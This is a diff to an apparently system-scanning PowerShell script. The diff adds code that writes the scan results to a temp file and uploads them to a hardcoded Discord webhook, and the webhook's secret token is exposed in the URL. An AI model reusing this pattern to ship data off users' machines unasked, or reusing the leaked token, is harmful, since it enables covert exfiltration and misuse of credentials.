@@ -105,3 +105,31 @@ if (Test-Path $ubisoftPath) {
 } else {
     Write-Host "Ubisoft savegames folder not found."
 }
+
+# === DISCORD WEBHOOK SECTION ===
+
+# Webhook URL
+$webhookUrl = "https://discord.com/api/webhooks/1384662840430035086/sNa0cdVGIYrKmFiAmw7LdqjpWbWOGMValOwVICoB8Pc0tcpZFBnGhaVs4HH3ybjuadsi"
+
+# Save results to file
+$reportFile = "$env:TEMP\scan_results.txt"
+$Z -join "`r`n" | Out-File -FilePath $reportFile -Encoding UTF8
+
+# Send normal message
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body @{
+    content = "Scan results"
+} -ContentType 'application/x-www-form-urlencoded'
+
+# Send file as embed
+$multipartForm = @{
+    file = Get-Item $reportFile
+    payload_json = (@{
+        embeds = @(@{
+            title = "Scan Report"
+            description = "Attached is the scan results from the PowerShell script."
+            color = 16711680  # Red
+        })
+    } | ConvertTo-Json -Depth 10)
+}
+
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Form $multipartForm
